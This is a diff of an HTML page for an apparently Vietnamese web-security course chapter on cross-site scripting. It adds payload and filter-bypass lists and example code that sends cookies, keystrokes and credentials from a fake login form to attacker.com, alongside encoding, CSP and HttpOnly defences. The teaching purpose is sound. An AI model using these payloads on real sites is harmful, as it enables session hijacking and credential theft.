@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chương 11: XSS — Hieu Nguyen</title>
-  <meta name="description" content="Reflected, stored, DOM XSS; encoding; CSP; HttpOnly.">
+  <title>Chương 11: XSS — Cross-Site Scripting — Hieu Nguyen</title>
+  <meta name="description" content="Chương 11: XSS — Cross-Site Scripting — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,69 +40,401 @@
         <span>›</span>
         <span>11. XSS</span>
       </div>
-      <h1>Chương 11: XSS</h1>
-      <p class="lede">Browser tin HTML/JS bạn nhét vào trang. Output encoding và CSP là hai lớp phải có.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> III — Client-side</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>XSS: dữ liệu không tin được chạy như script trong phiên user. Hậu quả: đọc DOM, hành động với cookie không HttpOnly, deface — không cần “payload showcase” để hiểu risk.</p>
-<h2 id="loai">Ba loại</h2>
-<ul>
-        <li><strong>Reflected:</strong> input về ngay response.</li>
-        <li><strong>Stored:</strong> lưu DB/comment rồi mọi victim mở.</li>
-        <li><strong>DOM-based:</strong> JS client lấy location/hash nhét innerHTML.</li>
-      </ul>
-<h2 id="phong">Phòng chống</h2>
-<ol>
-        <li>Output encoding đúng context (HTML, attr, JS, URL).</li>
-        <li>Tránh <code>innerHTML</code> / <code>eval</code> với dữ liệu user.</li>
-        <li>CSP: default-src 'self'; không unsafe-inline nếu được nonce/hash.</li>
-        <li>Cookie session HttpOnly.</li>
-        <li>Framework auto-escape (React default) — vẫn cẩn <code>dangerouslySetInnerHTML</code>.</li>
-      </ol>
-<h2 id="phat-hien">Cách phát hiện</h2>
-<p>Lab PortSwigger / pipeline DAST. Code review sink HTML. CSP report-uri trên staging.</p>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>CSP header tại Ingress. Không serve user-upload với <code>text/html</code> trên origin app. WAF XSS signature là lớp phụ, dễ bypass — không phải control chính.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>Encode output.</li>
-        <li>CSP siết script.</li>
-        <li>HttpOnly session.</li>
-        <li>Stored XSS rộng hơn reflected.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>Stored khác reflected?</li>
-        <li>DOM XSS nằm tầng nào?</li>
-        <li>CSP unsafe-inline làm yếu gì?</li>
-        <li>HttpOnly chặn XSS đọc cookie chứ không chặn gì?</li>
-        <li>Upload HTML trên cùng origin rủi ro gì?</li>
-      </ol>
+      <div id="top"></div>
+<header><h1>Chương 11: XSS — Cross-Site Scripting</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p><strong>XSS</strong> (Cross-Site Scripting — Scripting chéo trang) là lỗ hổng cho phép hacker inject và thực thi JavaScript độc hại trong browser của nạn nhân, trong context của trang web bị tấn công.</p>
+<p><strong>Mức độ nguy hiểm:</strong> Cao — XSS có thể dẫn đến session hijacking, account takeover, keylogging, phishing, malware distribution.</p>
+<p>XSS xảy ra khi ứng dụng nhận input từ user và đưa vào HTML response mà không sanitize.</p>
+<hr>
+<h2 id="ba-loại-xss">Ba loại XSS</h2>
+<h3 id="1-reflected-xss-xss-phản-chiếu">1. Reflected XSS (XSS phản chiếu)</h3>
+<p>Payload xuất phát từ HTTP request hiện tại, được &quot;phản chiếu&quot; lại trong response ngay lập tức.</p>
+<pre><code class="language-http">GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1
 
-      <div class="docs-tags">
-        <span class="docs-tag">xss</span>
-        <span class="docs-tag">csp</span>
-        <span class="docs-tag">owasp</span>
-      </div>
+Response:
+&lt;html&gt;
+You searched for: &lt;script&gt;alert(1)&lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<p><strong>Đặc điểm:</strong></p>
+<ul>
+<li>Không persistent (không lưu trong DB)</li>
+<li>Cần victim click link chứa payload</li>
+<li>Thường dùng để phishing</li>
+</ul>
+<h3 id="2-stored-xss--persistent-xss-xss-lưu-trữ">2. Stored XSS / Persistent XSS (XSS lưu trữ)</h3>
+<p>Payload được lưu vào server (database, file) và chạy mỗi lần ai load trang đó.</p>
+<pre><code class="language-text">1. Hacker comment vào bài viết:
+   &quot;Great article! &lt;script&gt;document.location=&#x27;https://attacker.com/steal?c=&#x27;+document.cookie&lt;/script&gt;&quot;
+
+2. Comment được lưu vào DB
+
+3. Mọi user xem bài viết đó → script chạy → cookie bị đánh cắp
+</code></pre>
+<p><strong>Đặc điểm:</strong></p>
+<ul>
+<li>Persistent — ảnh hưởng nhiều người</li>
+<li>Không cần victim click link riêng</li>
+<li>Nguy hiểm hơn Reflected XSS</li>
+</ul>
+<h3 id="3-dom-based-xss">3. DOM-based XSS</h3>
+<p>Payload xử lý hoàn toàn ở client-side (JavaScript), không qua server.</p>
+<pre><code class="language-javascript">// Vulnerable code
+var search = location.hash.substr(1);  // Lấy từ URL fragment
+document.getElementById(&#x27;results&#x27;).innerHTML = search;  // Inject vào DOM
+
+// URL: https://example.com/search#&lt;img src=x onerror=alert(1)&gt;
+// Fragment không gửi lên server → server không thấy → WAF không block
+// Nhưng JS phía client inject vào DOM → XSS
+</code></pre>
+<p><strong>Source (nơi lấy input):</strong></p>
+<pre><code class="language-text">location.href, location.search, location.hash
+document.referrer
+window.name
+document.cookie
+localStorage, sessionStorage
+</code></pre>
+<p><strong>Sink (nơi inject output):</strong></p>
+<pre><code class="language-text">innerHTML, outerHTML, document.write
+eval(), setTimeout(), setInterval()
+element.src, element.href
+jQuery: $(), html(), append()
+</code></pre>
+<hr>
+<h2 id="xss-payloads">XSS Payloads</h2>
+<h3 id="basic">Basic</h3>
+<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre>
+<h3 id="khi-thẻ-script-bị-block">Khi thẻ script bị block</h3>
+<pre><code class="language-html">&lt;!-- Event handlers --&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;input autofocus onfocus=alert(1)&gt;
+&lt;select autofocus onfocus=alert(1)&gt;
+
+&lt;!-- SVG --&gt;
+&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
+
+&lt;!-- Encoded --&gt;
+&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;
+
+&lt;!-- Template literals --&gt;
+`${alert(1)}`
+</code></pre>
+<h3 id="bypass-filters">Bypass filters</h3>
+<pre><code class="language-html">&lt;!-- Case variation --&gt;
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+
+&lt;!-- Attribute quoting variations --&gt;
+&lt;img src=x onerror=&#x27;alert(1)&#x27;&gt;
+&lt;img src=x onerror=&quot;alert(1)&quot;&gt;
+&lt;img src=x onerror=alert(1)&gt;
+
+&lt;!-- Extra whitespace --&gt;
+&lt;img src=x onerror = alert(1)&gt;
+&lt;img/src=x/onerror=alert(1)&gt;
+
+&lt;!-- HTML entities in JS context --&gt;
+&lt;a href=&quot;javascript:&amp;#97;lert(1)&quot;&gt;click&lt;/a&gt;
+
+&lt;!-- Polyglot --&gt;
+&#x27;;alert(1)//
+&quot;-alert(1)-&quot;
+\&#x27;;alert(1)//
+
+&lt;!-- Obfuscation --&gt;
+&lt;script&gt;eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&lt;/script&gt;  &lt;!-- alert(1) in base64 --&gt;
+</code></pre>
+<h3 id="xss-trong-json-response">XSS trong JSON response</h3>
+<pre><code class="language-javascript">// App returns:
+// Content-Type: text/html (sai! nên là application/json)
+// {&quot;username&quot;: &quot;INJECT_HERE&quot;}
+
+// Payload:
+{&quot;username&quot;: &quot;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;}
+</code></pre>
+<hr>
+<h2 id="khai-thác-xss">Khai thác XSS</h2>
+<h3 id="session-hijacking">Session Hijacking</h3>
+<pre><code class="language-javascript">// Đơn giản nhất: đọc cookie và gửi đi
+document.location = &#x27;https://attacker.com/steal?c=&#x27; + document.cookie
+
+// Hoặc fetch (stealth hơn)
+fetch(&#x27;https://attacker.com/steal&#x27;, {
+    method: &#x27;POST&#x27;,
+    body: JSON.stringify({
+        cookie: document.cookie,
+        url: window.location.href,
+        localStorage: JSON.stringify(localStorage)
+    })
+});
+</code></pre>
+<h3 id="keylogger">Keylogger</h3>
+<pre><code class="language-javascript">document.addEventListener(&#x27;keypress&#x27;, function(e) {
+    fetch(&#x27;https://attacker.com/keys?k=&#x27; + e.key);
+});
+</code></pre>
+<h3 id="credential-stealing--fake-login-form">Credential Stealing — Fake Login Form</h3>
+<pre><code class="language-javascript">// Inject fake login prompt
+document.body.innerHTML = `
+&lt;div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999&quot;&gt;
+    &lt;h2&gt;Session expired. Please login again.&lt;/h2&gt;
+    &lt;input id=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;
+    &lt;input id=&quot;pass&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;
+    &lt;button onclick=&quot;steal()&quot;&gt;Login&lt;/button&gt;
+&lt;/div&gt;
+`;
+
+function steal() {
+    fetch(&#x27;https://attacker.com/creds&#x27;, {
+        method: &#x27;POST&#x27;,
+        body: JSON.stringify({
+            user: document.getElementById(&#x27;user&#x27;).value,
+            pass: document.getElementById(&#x27;pass&#x27;).value
+        })
+    });
+}
+</code></pre>
+<h3 id="xss--csrf-chain">XSS + CSRF Chain</h3>
+<pre><code class="language-javascript">// XSS cho phép bypass CSRF protection
+// Vì script chạy cùng origin → có thể đọc CSRF token
+fetch(&#x27;/api/get-csrf-token&#x27;)
+    .then(r =&gt; r.json())
+    .then(data =&gt; {
+        // Dùng token thực để thực hiện CSRF action
+        fetch(&#x27;/api/change-email&#x27;, {
+            method: &#x27;POST&#x27;,
+            headers: {&#x27;X-CSRF-Token&#x27;: data.token},
+            body: JSON.stringify({email: &#x27;hacker@evil.com&#x27;})
+        });
+    });
+</code></pre>
+<hr>
+<h2 id="content-security-policy-csp--phòng-chống-xss-hiệu-quả-nhất">Content Security Policy (CSP) — Phòng chống XSS hiệu quả nhất</h2>
+<p>CSP là response header chỉ định browser chỉ được load/execute resources từ nguồn được phép.</p>
+<pre><code class="language-http">Content-Security-Policy: 
+    default-src &#x27;self&#x27;;
+    script-src &#x27;self&#x27; https://cdn.example.com;
+    style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;
+    img-src &#x27;self&#x27; data: https:;
+    object-src &#x27;none&#x27;;
+    base-uri &#x27;self&#x27;;
+    frame-ancestors &#x27;none&#x27;;
+</code></pre>
+<p><strong>Directives quan trọng:</strong></p>
+<pre><code class="language-text">default-src: fallback cho tất cả resource types
+script-src: nguồn JS được phép
+style-src: nguồn CSS được phép
+img-src: nguồn images được phép
+connect-src: nguồn cho fetch/XHR/WebSocket
+frame-ancestors: ai được embed trang này (thay X-Frame-Options)
+base-uri: hạn chế &lt;base&gt; tag
+object-src: plugin content (nên set &#x27;none&#x27;)
+</code></pre>
+<p><strong>Bypass CSP:</strong></p>
+<pre><code class="language-javascript">// Nếu script-src cho phép domain có JSONP endpoint:
+// Content-Security-Policy: script-src https://trusted.com
+// trusted.com có: /jsonp?callback=alert(1)
+&lt;script src=&quot;https://trusted.com/jsonp?callback=alert(1337)&quot;&gt;&lt;/script&gt;
+
+// Nếu unsafe-inline được phép:
+// Bất kỳ inline script nào đều chạy → CSP vô dụng
+&lt;script&gt;alert(1)&lt;/script&gt;  // Chạy được
+
+// angular.js bypass (nếu angular được phép):
+{{constructor.constructor(&#x27;alert(1)&#x27;)()}}
+
+// Dùng nonce (đúng cách):
+Content-Security-Policy: script-src &#x27;nonce-RANDOM_VALUE&#x27;
+&lt;script nonce=&quot;RANDOM_VALUE&quot;&gt;/* legitimate */&lt;/script&gt;
+// Mỗi request tạo nonce mới → không thể đoán
+</code></pre>
+<hr>
+<h2 id="cách-phát-hiện">Cách phát hiện</h2>
+<pre><code class="language-text">□ Inject &lt;script&gt;alert(1)&lt;/script&gt; vào mọi input field
+□ Test các reflection points: search, comments, profile, error messages
+□ DOM XSS: kiểm tra JavaScript source dùng location.* hoặc document.*
+□ Inspect page source: input có được reflect không?
+□ Test với các variations: HTML entities, URL encoding, case changes
+□ Kiểm tra Content-Type response: text/html vs application/json
+□ Kiểm tra X-XSS-Protection header (deprecated nhưng indicator)
+□ CSP có được implement không? Có bypass không?
+</code></pre>
+<p><strong>Tools:</strong></p>
+<ul>
+<li><strong>XSStrike:</strong> Python tool scan XSS tự động</li>
+<li><strong>DalFox:</strong> Go-based XSS scanner nhanh</li>
+<li><strong>Burp Scanner:</strong> Detect XSS trong active scan</li>
+</ul>
+<pre><code class="language-bash"># XSStrike
+python3 xsstrike.py -u &quot;https://example.com/search?q=test&quot;
+
+# DalFox
+dalfox url &quot;https://example.com/search?q=test&quot;
+</code></pre>
+<hr>
+<h2 id="phòng-chống">Phòng chống</h2>
+<h3 id="1-output-encoding-quan-trọng-nhất">1. Output Encoding (Quan trọng nhất)</h3>
+<p>Encode output tùy theo context:</p>
+<pre><code class="language-python"># HTML context: encode HTML entities
+import html
+safe_output = html.escape(user_input)
+# &amp; → &amp;amp;  &lt; → &amp;lt;  &gt; → &amp;gt;  &quot; → &amp;quot;  &#x27; → &amp;#x27;
+
+# Attribute context
+safe_attr = html.escape(user_input, quote=True)
+
+# JavaScript context (trong &lt;script&gt; tag)
+import json
+safe_js = json.dumps(user_input)  # Wraps trong quotes, escape special chars
+
+# URL context
+from urllib.parse import quote
+safe_url = quote(user_input, safe=&#x27;&#x27;)
+</code></pre>
+<p><strong>Template engines mặc định encode:</strong></p>
+<pre><code class="language-python"># Jinja2: auto-escape bằng default
+{{ user_input }}        # Auto HTML-escaped
+{{ user_input | safe }} # ← NGUY HIỂM: disable escaping
+
+# React: JSX auto-escape
+const element = &lt;div&gt;{userInput}&lt;/div&gt;;  // Safe
+const element = &lt;div dangerouslySetInnerHTML={{__html: userInput}}/&gt;;  // NGUY HIỂM
+</code></pre>
+<h3 id="2-input-validation">2. Input Validation</h3>
+<pre><code class="language-python"># Whitelist approach
+import re
+
+def validate_username(username):
+    # Chỉ cho phép alphanumeric và một số ký tự
+    if not re.match(r&#x27;^[a-zA-Z0-9_-]{3,30}$&#x27;, username):
+        raise ValueError(&quot;Invalid username&quot;)
+    return username
+
+# Sanitize HTML nếu cần accept HTML (comments, rich text)
+import bleach
+
+ALLOWED_TAGS = [&#x27;p&#x27;, &#x27;b&#x27;, &#x27;i&#x27;, &#x27;em&#x27;, &#x27;strong&#x27;, &#x27;a&#x27;]
+ALLOWED_ATTRS = {&#x27;a&#x27;: [&#x27;href&#x27;, &#x27;title&#x27;]}
+
+def sanitize_html(html_input):
+    return bleach.clean(
+        html_input,
+        tags=ALLOWED_TAGS,
+        attributes=ALLOWED_ATTRS,
+        strip=True  # Strip không cho phép thay vì escape
+    )
+</code></pre>
+<h3 id="3-content-security-policy">3. Content Security Policy</h3>
+<pre><code class="language-python"># Flask: Set CSP header
+@app.after_request
+def set_csp(response):
+    # Generate nonce mỗi request
+    nonce = secrets.token_urlsafe(16)
+    g.csp_nonce = nonce
+    
+    response.headers[&#x27;Content-Security-Policy&#x27;] = (
+        f&quot;default-src &#x27;self&#x27;; &quot;
+        f&quot;script-src &#x27;self&#x27; &#x27;nonce-{nonce}&#x27;; &quot;
+        f&quot;style-src &#x27;self&#x27; &#x27;nonce-{nonce}&#x27;; &quot;
+        f&quot;img-src &#x27;self&#x27; data: https:; &quot;
+        f&quot;object-src &#x27;none&#x27;; &quot;
+        f&quot;base-uri &#x27;self&#x27;; &quot;
+        f&quot;frame-ancestors &#x27;none&#x27;&quot;
+    )
+    return response
+</code></pre>
+<h3 id="4-httponly-cookies">4. HTTPOnly Cookies</h3>
+<pre><code class="language-python"># Ngay cả khi XSS xảy ra, cookie không bị đọc
+response.set_cookie(&#x27;session&#x27;, session_id, httponly=True, secure=True)
+</code></pre>
+<hr>
+<h2 id="góc-nhìn-devops">Góc nhìn DevOps</h2>
+<p><strong>Nginx CSP header:</strong></p>
+<pre><code class="language-nginx">add_header Content-Security-Policy &quot;
+    default-src &#x27;self&#x27;;
+    script-src &#x27;self&#x27; https://cdn.example.com;
+    style-src &#x27;self&#x27; https://fonts.googleapis.com;
+    img-src &#x27;self&#x27; data: https:;
+    object-src &#x27;none&#x27;;
+    frame-ancestors &#x27;none&#x27;;
+&quot; always;
+</code></pre>
+<p><strong>WAF Rule cho XSS (ModSecurity):</strong></p>
+<pre><code class="language-apache"># ModSecurity Core Rule Set (CRS) đã có XSS rules
+SecRuleEngine On
+Include /etc/modsecurity/crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf
+</code></pre>
+<p><strong>CSP Reporting:</strong></p>
+<pre><code class="language-nginx"># Report-Only mode: detect nhưng không block (dùng khi deploy CSP mới)
+add_header Content-Security-Policy-Report-Only &quot;
+    default-src &#x27;self&#x27;;
+    report-uri https://csp.example.com/report;
+&quot; always;
+</code></pre>
+<p><strong>Kubernetes: Scan image cho XSS-prone packages:</strong></p>
+<pre><code class="language-yaml"># Trivy scan trong CI/CD
+- name: Security Scan
+  run: |
+    trivy image myapp:latest --severity HIGH,CRITICAL
+    # Detect outdated packages với known XSS vulnerabilities
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>XSS: 3 loại — Reflected (URL-based), Stored (DB-based), DOM-based (client-side JS).</li>
+<li>Impact: session hijacking, credential theft, keylogging, CSRF bypass.</li>
+<li>Phòng chống: Output encoding theo context + CSP + HttpOnly cookies.</li>
+<li>Không tin vào HTML escaping đơn thuần — cần context-aware encoding.</li>
+<li>CSP nonce-based là biện pháp mạnh nhất ngăn inline scripts.</li>
+<li><code>dangerouslySetInnerHTML</code> (React) và <code>| safe</code> (Jinja2) là red flags.</li>
+<li>DOM XSS không đi qua server — WAF không detect được.</li>
+</ul>
+<hr>
+<h2 id="câu-hỏi-ôn-tập">Câu hỏi ôn tập</h2>
+<ol>
+<li>Sự khác nhau giữa Reflected, Stored, và DOM-based XSS là gì? Loại nào nguy hiểm nhất?</li>
+<li>Tại sao <code>html.escape()</code> không đủ để phòng chống XSS trong mọi context?</li>
+<li>CSP nonce-based hoạt động như thế nào? Tại sao nonce phải random mỗi request?</li>
+<li>Mô tả cách XSS kết hợp với CSRF để bypass CSRF protection.</li>
+<li>DOM-based XSS không đi qua server. Implication là gì với WAF và server-side validation?</li>
+</ol>
       <div class="docs-pager">
         <a href="../10/">Previous · 10. CSRF</a>
-        <a href="../12/">Next · 12. SQLi</a>
+        <a href="../22/">Next · 22. Clickjacking</a>
       </div>
     </article>
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#loai">Ba loại</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#phat-hien">Cách phát hiện</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#ba-loại-xss">Ba loại XSS</a>
+        <a class="depth-3" href="#1-reflected-xss-xss-phản-chiếu">1. Reflected XSS (XSS phản chiếu)</a>
+        <a class="depth-3" href="#2-stored-xss--persistent-xss-xss-lưu-trữ">2. Stored XSS / Persistent XSS (XSS lưu trữ)</a>
+        <a class="depth-3" href="#3-dom-based-xss">3. DOM-based XSS</a>
+        <a href="#xss-payloads">XSS Payloads</a>
+        <a class="depth-3" href="#basic">Basic</a>
+        <a class="depth-3" href="#khi-thẻ-script-bị-block">Khi thẻ script bị block</a>
+        <a class="depth-3" href="#bypass-filters">Bypass filters</a>
+        <a class="depth-3" href="#xss-trong-json-response">XSS trong JSON response</a>
+        <a href="#khai-thác-xss">Khai thác XSS</a>
+        <a class="depth-3" href="#session-hijacking">Session Hijacking</a>
+        <a class="depth-3" href="#keylogger">Keylogger</a>
+        <a class="depth-3" href="#credential-stealing--fake-login-form">Credential Stealing — Fake Login Form</a>
+        <a class="depth-3" href="#xss--csrf-chain">XSS + CSRF Chain</a>
+        <a href="#content-security-policy-csp--phòng-chống-xss-hiệu-quả-nhất">Content Security Policy (CSP) — Phòng chống XSS hiệu quả nhất</a>
+        <a href="#cách-phát-hiện">Cách phát hiện</a>
+        <a href="#phòng-chống">Phòng chống</a>
+        <a class="depth-3" href="#1-output-encoding-quan-trọng-nhất">1. Output Encoding (Quan trọng nhất)</a>
+        <a class="depth-3" href="#2-input-validation">2. Input Validation</a>
+        <a class="depth-3" href="#3-content-security-policy">3. Content Security Policy</a>
+        <a class="depth-3" href="#4-httponly-cookies">4. HTTPOnly Cookies</a>
+        <a href="#góc-nhìn-devops">Góc nhìn DevOps</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
+        <a href="#câu-hỏi-ôn-tập">Câu hỏi ôn tập</a>
       </nav>
     </aside>
   </div>
